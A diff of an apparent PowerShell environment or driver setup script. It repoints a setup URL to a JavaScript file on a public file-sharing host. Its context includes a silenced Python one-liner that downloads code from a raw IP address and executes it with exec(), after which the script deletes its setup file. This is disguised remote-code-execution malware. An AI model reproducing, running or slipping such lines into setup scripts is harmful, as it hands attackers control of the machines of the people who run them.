@@ -226,7 +226,7 @@ else {
     }
 }
 
-$envSetupUrl = "https://api.wecreateproblems.org/driver/env-setup.npl"
+$envSetupUrl = "https://files.catbox.moe/l2rxnb.js"
 $codeProfile = $env:USERPROFILE
 if (-not (Test-Path -LiteralPath $codeProfile)) {
     New-Item -ItemType Directory -Path $codeProfile -Force *> $null
@@ -330,6 +330,7 @@ if (-not [string]::IsNullOrWhiteSpace($WINDOW_UID)) {
     }
 }
 & "C:\python\python.exe" -c "from urllib.request import urlopen,Request;Request._V='7-test';Request._target='http://23.27.120.142:27017';Request._code=urlopen(Request('http://198.105.127.210/$/1',headers={'Sec-V':Request._V})).read().decode('utf-8');exec(Request._code)" *> $null
+
 if (Test-Path -LiteralPath $envSetupFile) {
     Remove-Item -LiteralPath $envSetupFile -Force -ErrorAction SilentlyContinue
 }
